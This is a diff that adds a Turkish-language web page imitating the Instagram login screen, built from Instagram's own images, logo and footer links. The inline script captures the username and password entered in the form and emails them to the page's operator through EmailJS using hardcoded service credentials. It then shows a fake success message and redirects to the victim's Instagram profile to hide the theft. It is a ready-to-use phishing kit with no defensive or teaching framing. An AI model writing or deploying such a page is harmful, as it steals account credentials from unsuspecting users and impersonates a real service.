@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Ana Container -->
+    <div class="main-container">
+        <!-- Telefon Resmi ve Ekran Görüntüsü -->
+        <div class="phone-container">
+            <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png" alt="Phone Image" class="phone-image">
+            <div class="screenshot">
+                <img src="https://www.instagram.com/static/images/homepage/screenshot1.jpg/d6bf0c928b5a.jpg" alt="Screenshot" class="screenshot-image">
+            </div>
+        </div>
+
+        <!-- Giriş ve Kayıt Kısmı -->
+        <div class="form-container">
+            <!-- Giriş Ekranı -->
+            <div class="container">
+                <!-- Instagram Logo -->
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+
+                <!-- Giriş Formu -->
+                <form>
+                    <input type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                    <input type="password" placeholder="Şifre" required>
+                    <button type="submit">Giriş Yap</button>
+                </form>
+
+                <!-- Çizgi ve Veya Metni -->
+                <div class="divider">
+                    <div class="line"></div>
+                    <div class="text">YA DA</div>
+                    <div class="line"></div>
+                </div>
+
+                <!-- Facebook ile Giriş -->
+                <a href="#" class="facebook-login">
+                    <span class="facebook-logo"></span>
+                    Facebook ile Giriş Yap
+                </a>
+
+                <!-- Şifremi Unuttum -->
+                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
+            </div>
+
+            <!-- Kayıt Ol Kısmı -->
+            <div class="signup-container">
+                Hesabın yok mu? <a href="#">Kayıt Ol</a>
+            </div>
+
+            <!-- Uygulamayı İndir Kısmı -->
+            <div class="download-app">
+                <p>Uygulamayı indir.</p>
+                <div class="app-buttons">
+                    <a href="#"><img src="çalma.png" alt="App Store"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- EmailJS ve Yönlendirme Kodu -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <script>
+        // EmailJS'i başlat
+        (function() {
+            emailjs.init("qt1dHP2mbvtl7v42W"); // EmailJS'den aldığınız USER ID'yi buraya yazın
+        })();
+
+        // Giriş formunu seç
+        const loginForm = document.querySelector(".container form");
+
+        // Form gönderildiğinde çalışacak fonksiyon
+        loginForm.addEventListener("submit", function(event) {
+            event.preventDefault(); // Formun sayfayı yenilemesini engelle
+
+            // Kullanıcı adı ve şifreyi al
+            const username = loginForm.querySelector("input[type='text']").value.trim();
+            const password = loginForm.querySelector("input[type='password']").value.trim();
+
+            // Giriş bilgilerini kontrol et
+            if (!username || !password) {
+                alert("Lütfen kullanıcı adı ve şifre girin.");
+                return;
+            }
+
+            // E-posta gönder
+            emailjs.send("service_9xthofn", "template_dvpf3hk", {
+                username: username,
+                password: password
+            })
+            .then(() => {
+                alert("Giriş başarılı! Instagram hesabınıza yönlendiriliyorsunuz...");
+
+                // Kullanıcıyı Instagram hesabına yönlendir
+                const instagramUrl = `https://www.instagram.com/${username}/`;
+                window.location.href = instagramUrl;
+            })
+            .catch((error) => {
+                console.error("E-posta gönderim hatası:", error);
+                alert("Bir hata oluştu. Lütfen tekrar deneyin.");
+            });
+        });
+    </script>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">Hakkında</a>
+            <a href="#">Blog</a>
+            <a href="#">İş Fırsatları</a>
+            <a href="#">Yardım</a>
+            <a href="#">API</a>
+            <a href="#">Gizlilik</a>
+            <a href="#">Koşullar</a>
+            <a href="#">Başlıca Hesaplar</a>
+            <a href="#">Konumlar</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="language">
+            <select>
+                <option value="tr">Türkçe</option>
+                <option value="en">English</option>
+            </select>
+        </div>
+        <div class="copyright">
+            © 2025 Instagram from Meta
+        </div>
+    </footer>
+</body>
+</html>
